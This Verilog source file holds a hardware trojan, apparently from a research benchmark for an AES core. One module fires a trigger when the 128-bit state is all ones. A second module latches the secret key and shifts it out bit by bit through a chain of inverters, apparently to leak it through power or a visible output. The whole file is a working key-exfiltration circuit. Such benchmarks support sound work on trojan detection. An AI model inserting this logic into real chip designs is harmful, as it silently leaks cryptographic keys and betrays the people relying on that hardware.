`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    18:18:26 03/08/2013 
// Design Name: 
// Module Name:    TSC 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module trojan_trigger(
    input clk,
    input rst,
    input [127:0] state,       
    output Tj_Trig1
    );
    
     reg Tj_Trig;
     reg tempClk1, tempClk2;
	  reg Detected;
	 
	 //wire INV1_out, INV2_out, INV3_out, INV4_out, INV5_out, INV6_out, INV7_out, INV8_out;  //unused version
	 
	 always @(tempClk1, tempClk2)
	 begin
		Tj_Trig <= tempClk1 | tempClk2;
	 end
	 
	 assign Tj_Trig1 = Tj_Trig;
	 
	 // Tj_Trig is high for two clock cycles
	 always @(posedge clk)      //totcond: rst+tmpclk1+tmpclk2+detected = 4
	 begin
		if (rst == 0)	begin tempClk1 <= 1; tempClk2 <= 0; end     //Tj_Trig high #1 -> reset  p=0.5
		else if ((tempClk1 == 1) && (Detected == 1))	begin tempClk1 <= 0; tempClk2 <= 1;	end  //Tj_Trig high #2 -> detected
		else if ((tempClk1 == 0) && (tempClk2 == 1))	begin tempClk2 <= 0;	end		
		else begin tempClk1 <= 0; tempClk2 <= 0; end
	 end
	 
	 always @(state)
	 begin      //totcond = 128
		if (state == 128'hFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)	  //p(state=0xFF..FF) = 1/2^128
			Detected <= 1; 
		else 
			Detected <= 0; 
	 end
	
endmodule 

module trojan(
    input clk,
    input rst,
    input Tj_Trig,
	input [127:0] key,
	output wire INV1_out, INV2_out, INV3_out, INV4_out, INV5_out, INV6_out, INV7_out, INV8_out //try to light up the LED
    );
    
     reg [127:0] SECRETKey;
	 reg [127:0] COUNTER;
	 reg LEAKBit;
	 
	 always @(rst, clk)
	 begin     //totcond:rst=1
			if (rst == 0)    //p=0.5 param: rst  Rcond=1/1=1
				COUNTER <= 0;
			else             //p=0.5     Rcond=1/1=1
				COUNTER <= COUNTER + 1;
	 end

	 always @(posedge Tj_Trig, posedge COUNTER[3]) //real value COUNTER[127]
	 begin         //totalcond: tjtrig=1
			if (Tj_Trig == 1)    //p=0.5 param: Tj_Trig     Rcond=1/1=1 
				SECRETKey <= key;
			else                 //p=0.5 param: Tj_Trig      Rcond=1/1=1
				SECRETKey <= SECRETKey >> 1;
	 end

//     counter
//	   count (clk,clk1);
	   
	 always @ (SECRETKey) //edited for trojan, use clk1
	 begin
			LEAKBit <= SECRETKey[0];
	 end

	 assign INV1_out = ~(LEAKBit);
	 assign INV2_out = ~(INV1_out);
	 assign INV3_out = ~(INV1_out);
	 assign INV4_out = ~(INV1_out);
	 assign INV5_out = ~(INV1_out);
	 assign INV6_out = ~(INV1_out);
	 assign INV7_out = ~(INV1_out);
	 assign INV8_out = ~(INV1_out);
	 
endmodule